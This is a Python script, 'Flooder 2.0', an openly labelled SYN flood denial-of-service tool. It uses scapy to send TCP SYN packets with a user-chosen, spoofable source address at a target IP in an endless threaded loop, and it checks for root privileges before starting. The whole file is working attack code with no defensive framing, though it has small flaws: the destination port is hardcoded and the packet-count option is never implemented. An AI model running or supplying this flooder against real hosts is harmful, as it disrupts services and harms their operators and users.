#!/usr/bin/python3
from scapy.all import *
from threading import *
import sys, random, argparse

def usage():
	print("SYN FLOOD attack script")
	print("")
	print("Usage: ./flooder2.py ")
	print("-t --threads                 - Number of concurrent threads to use [default 50]")
	print("-d --destination             - Ip of destination")
	print("-p --port                    - Port of destination")
	print("-s --source                  - Source ip address")
	print("-c --count					- Number of packets to send")
	print("")
	print("Example: ./flooder2.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
	sys.exit(0)

class Flooder(Thread):
	def __init__(self,target,ip):
		Thread.__init__(self)
		self.target = target
		self.ip = ip

	def build_packet(self):
		dest_port = 80
		src_port = random.randint(1025, 65535)
		sequence = random.randint(1000,100000)
		opt = [("MSS", 65495), ("SAckOK", b''), ('Timestamp', (4294693388, 0)),  ("NOP", None), ("WScale",10)]
		window = 65495
		ip = IP(src=self.ip, dst=self.target)
		tcp = TCP(sport=src_port, dport=dest_port, flags="S", window=window, seq=sequence, options=opt)
		packet = ip/tcp

		return packet

	def run(self):
		packet = self.build_packet()
		
		try:
			send(packet, verbose=False)
			#send(packet,verbose=False)
		except KeyboardInterrupt:
			print("Operation interrupted by user...")
			sys.exit(0)

def main():
	parser = argparse.ArgumentParser(description="Flooder 2.0: SYN FLOOD Attack Tool")
	parser.add_argument("-d", "--destination", help="Destination IP Address")
	parser.add_argument("-p", "--port", help="Destinatin Port")
	parser.add_argument("-s", "--source", help="Source address to send from")
	parser.add_argument("-t", "--threads", default=500, help="Number of threads to use")

	args = parser.parse_args()

	if not len(sys.argv[1:]):
		usage()

	uid = os.getuid()
	if uid == 0:
		print("[*] Permissions look good. Lets run this bitch...")
		time.sleep(0.5)
	else:
		print('[-] Not enough permissions to run this script. Try with sudo...')
		sys.exit(1)

	target = args.destination
	target_port = int(args.port)
	ip = args.source
	
	threads=[]
	print('[*] Started SYN Flood on: {}'.format(target))
	while True:
		try:
			threads = int(args.threads)
			for x in range(0,threads):
					thread=Flooder(target,ip)
					thread.setDaemon(True)
					thread.start()
					thread.join()
		except KeyboardInterrupt:
			print('[-] Canceled by user...')
			sys.exit(0)	

if __name__ == "__main__":
	main()

	

